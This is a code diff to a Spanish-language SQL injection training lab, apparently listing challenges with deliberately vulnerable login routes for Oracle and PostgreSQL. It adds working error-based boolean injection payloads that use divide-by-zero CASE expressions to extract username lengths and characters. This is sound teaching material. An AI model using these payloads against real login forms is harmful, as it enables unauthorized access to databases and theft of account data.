@@ -8,7 +8,7 @@ sql_injections = {
         "description": """
             <p>La inyección SQL basada en errores es una técnica de ataque en la que un atacante manipula consultas SQL para provocar que la base de datos genere mensajes de error detallados. Estos mensajes pueden revelar información sensible sobre la estructura y el contenido de la base de datos, facilitando al atacante la planificación de ataques más sofisticados. Para mitigar este riesgo, es esencial validar y sanear todas las entradas de usuario, utilizar consultas parametrizadas y configurar la aplicación para que no revele detalles internos en mensajes de error.</p>
         """,
-        "dificultad": 2,
+        "dificultad": 1,
         "impacto": 2,
         "credenciales":[
             {
@@ -41,20 +41,20 @@ sql_injections = {
         "function_oracle": login_inseguro_errors_oracle,
         "function_postgres": login_inseguro_errors_postgresql
     },
-    "server_error": {
-        "title": "Server-Errors SQL Injection",
-        "description": """
-            <p>Utiliza los mensajes de error devueltos por el servidor para obtener información sobre la base de datos
-            y realizar inyecciones de manera eficaz.</p>
-        """,
-        "credenciales":[],
-        "usuario": "admin",
-        "clave": "admin",
-        "route_oracle": "login_oracle_server_error",
-        "route_postgres": "login_postgres_server_error",
-        "function_oracle": login_inseguro_errors_oracle,
-        "function_postgres": login_inseguro_errors_postgresql
-    },
+    #"server_error": {
+    #    "title": "Server-Errors SQL Injection",
+    #    "description": """
+    #        <p>Utiliza los mensajes de error devueltos por el servidor para obtener información sobre la base de datos
+    #        y realizar inyecciones de manera eficaz.</p>
+    #    """,
+    #    "credenciales":[],
+    #    "usuario": "admin",
+    #    "clave": "admin",
+    #    "route_oracle": "login_oracle_server_error",
+    #    "route_postgres": "login_postgres_server_error",
+    #    "function_oracle": login_inseguro_errors_oracle,
+    #    "function_postgres": login_inseguro_errors_postgresql
+    #},
     "union": {
         "title": "UNION-Attack SQL Injection",
         "description": """
@@ -112,11 +112,27 @@ sql_injections = {
     "boolean": {
         "title": "Boolean-Based SQL Injection",
         "description": """
-            <p>La inyección SQL basada en booleanos es una técnica utilizada por atacantes para manipular consultas SQL mediante la inserción de condiciones booleanas en las entradas de una aplicación web. A diferencia de la inyección SQL ciega, en este caso la aplicación muestra directamente los resultados de las consultas o proporciona mensajes de error detallados. El atacante aprovecha esta retroalimentación para extraer información de la base de datos, observando cómo las respuestas de la aplicación varían al introducir diferentes condiciones booleanas en las consultas.</p>
+            <p>La inyección SQL basada en booleanos es una técnica utilizada por atacantes para manipular consultas SQL mediante la inserción de condiciones booleanas en las entradas de una aplicación web. La aplicación proporciona mensajes de error. El atacante aprovecha esta retroalimentación para extraer información de la base de datos, observando cómo las respuestas de la aplicación varían al introducir diferentes condiciones booleanas en las consultas.</p>
         """,
         "dificultad": 2,
         "impacto": 3,
-        "credenciales":[],
+        "credenciales":[
+            {
+                "nombre":"Provocando un error 'división por cero' para sacar la longitud de un campo (Oracle)",
+                "usuario":"' OR (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1/0 ELSE 1 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
+                "password":"cualquier_input"
+            },
+            {
+                "nombre":"Provocando un error 'división por cero' para sacar un carácter de un campo (Oracle)",
+                "usuario":"' OR (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1/0 ELSE 1 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
+                "password":"cualquier_input"
+            },
+            {
+                "nombre":"PostgreSQL no permite esto", #PostgreSQL no permite aplicar la técnica para forzar un error 'división por cero' ya que toda la consulta es analizada y evaluada en su totalidad antes de devolver un resultado, lo que provoca el error aun sin cumplir la condición
+                "usuario":"' OR (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1/0 ELSE 1 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --",
+                "password":"cualquier_input"
+            }
+        ],
         "usuario": "admin",
         "clave": "admin",
         "route_oracle": "login_oracle_boolean",
